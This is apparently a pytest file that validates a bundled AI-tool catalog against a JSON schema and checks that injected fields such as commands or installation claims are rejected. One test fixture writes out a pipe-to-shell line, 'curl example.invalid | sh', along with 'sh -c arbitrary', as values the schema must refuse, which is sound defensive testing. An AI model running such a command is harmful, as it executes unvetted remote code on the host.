"""The shipped catalog must match the source and remain declarative."""
import copy
import json
from pathlib import Path

import jsonschema
import pytest

from conduct_cli.tool_catalog import CATALOG, TOOLS
from conduct_cli.guard_commands import inventory

ROOT = Path(__file__).resolve().parents[3]
SCHEMA = json.loads((ROOT / "config/tool_catalog.schema.json").read_text())


def test_catalog_conforms_and_is_bundled():
    jsonschema.Draft202012Validator.check_schema(SCHEMA)
    jsonschema.validate(CATALOG, SCHEMA)
    assert CATALOG == json.loads((ROOT / "config/tool_catalog.json").read_text())
    assert CATALOG == json.loads((ROOT / "apps/api/app/core/tool_catalog.json").read_text())
    assert len(TOOLS) == len(CATALOG["tools"])
    surfaces = [surface for tool in TOOLS.values() for surface in tool["surfaces"]]
    assert len(surfaces) == len(set(surfaces))
    assert inventory.TOOLS == tuple(TOOLS)
    for tool in TOOLS.values():
        route = tool["gateway"]
        if route:
            assert route["operation"] == {
                "openai": "openai_responses", "anthropic": "anthropic_messages"
            }[route["provider"]]
        assert tool["setup_ui"]


@pytest.mark.parametrize("field,value", [
    ("command", "curl example.invalid | sh"),
    ("verified", True),
    ("protected", True),
    ("executable", "sh -c arbitrary"),
    ("live_acceptance", "unsupported"),
])
def test_rejects_commands_and_installation_claims(field, value):
    catalog = copy.deepcopy(CATALOG)
    catalog["tools"][0][field] = value
    with pytest.raises(jsonschema.ValidationError):
        jsonschema.validate(catalog, SCHEMA)


def test_desktop_identity_is_not_migrated_by_metadata():
    assert TOOLS["codex"]["surfaces"] == ["codex-cli", "codex-desktop"]
    assert inventory.canonical_tool("codex-desktop") == "codex"
    for tool in ("cursor", "windsurf"):
        assert TOOLS[tool]["live_acceptance"] == "pending"


def test_unknown_version_is_rejected():
    catalog = copy.deepcopy(CATALOG)
    catalog["schema_version"] = 2
    with pytest.raises(jsonschema.ValidationError):
        jsonschema.validate(catalog, SCHEMA)
